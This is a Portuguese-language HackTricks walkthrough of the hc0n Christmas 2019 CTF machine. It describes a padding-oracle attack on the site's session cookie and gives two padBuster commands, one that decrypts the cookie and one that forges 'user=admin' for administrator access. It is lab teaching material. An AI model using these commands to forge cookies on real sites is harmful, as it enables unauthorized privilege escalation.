# hc0n Christmas CTF - 2019

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

![](../../.gitbook/assets/41d0cdc8d99a8a3de2758ccbdf637a21.jpeg)

## Enumeração

Comecei **enumerando a máquina usando minha ferramenta** [**Legion**](https://github.com/carlospolop/legion):

![](<../../.gitbook/assets/image (244).png>)

Existem 2 portas abertas: 80 (**HTTP**) e 22 (**SSH**)

Na página da web, você pode **registrar novos usuários**, e notei que **o comprimento do cookie depende do comprimento do nome de usuário** indicado:

![](<../../.gitbook/assets/image (245).png>)

![](<../../.gitbook/assets/image (246).png>)

E se você alterar algum **byte** do **cookie**, você recebe este erro:

![](<../../.gitbook/assets/image (247).png>)

Com essa informação e [**lendo a vulnerabilidade do oráculo de preenchimento**](../../cryptography/padding-oracle-priv.md) consegui explorá-la:
```bash
perl ./padBuster.pl http://10.10.231.5/index.php "GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" 8 -encoding 0 -cookies "hcon=GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy"
```
![](<../../.gitbook/assets/image (248).png>)

![](<../../.gitbook/assets/image (249) (1).png>)

**Definir usuário como administrador:**
```bash
perl ./padBuster.pl http://10.10.231.5/index.php "GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" 8 -encoding 0 -cookies "hcon=GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" -plaintext "user=admin"
```
![](<../../.gitbook/assets/image (250).png>)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me no** **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
